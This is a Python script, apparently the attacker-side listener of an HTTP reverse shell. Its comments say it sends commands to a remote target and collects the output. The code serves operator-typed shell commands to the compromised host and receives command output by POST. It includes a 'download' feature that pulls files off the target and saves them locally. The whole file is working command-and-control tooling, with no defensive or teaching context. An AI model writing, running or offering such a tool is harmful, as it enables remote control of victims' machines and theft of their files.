#this script accepts a connection
#from a remote host using HTTP,
#sends a command to be executed by 
#the target and receives the output
#via POST.

import sys
import os
import http.server
import cgi

def check_args():
	if len(sys.argv) ==3:
		global ip
		global port 
		ip = str(sys.argv[1])
		port = int(sys.argv[2])
	else:
		print(f'Usage: python3 {sys.argv[0]} <IP> <port>')

class MyHandler(http.server.BaseHTTPRequestHandler):
	def do_GET(self):
		command = input('Shell>')
		if command.startswith('download '):
			global filename
			_,path = command.split(' ')
			filename = os.path.basename(path)
			print('[+]Downloading file...')
		self.send_response(200)
		self.send_header('Content-type','text/html')
		self.end_headers()
		self.wfile.write(command.encode())

	def do_POST(self):
		if self.path == '/download_file':
			try:
				ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
				if ctype == 'multipart/form-data':
					fs = cgi.FieldStorage(fp=self.rfile, headers = self.headers, environ = {'REQUEST_METHOD' : 'POST'})
				else:
					print('[-]Unexpected POST request')
				fs_up = fs['file']
				with open(os.path.join(os.getcwd(),filename),'wb') as o:
					o.write(fs_up.file.read())
					self.send_response(200)
					self.end_headers()
			except Exception as e:
				print(e)
			return 

		self.send_response(200)
		self.end_headers()
		length = int(self.headers['Content-length'])
		body = self.rfile.read(length)
		print(body.decode())

if __name__=='__main__':
	check_args()
	server_class = http.server.HTTPServer
	httpd = server_class((ip, port), MyHandler)
	print(f'[+]Listening on port {port}...')
	try:
		httpd.serve_forever()
	except KeyboardInterrupt:
		print(f'[+]Exiting...')
		httpd.server_close()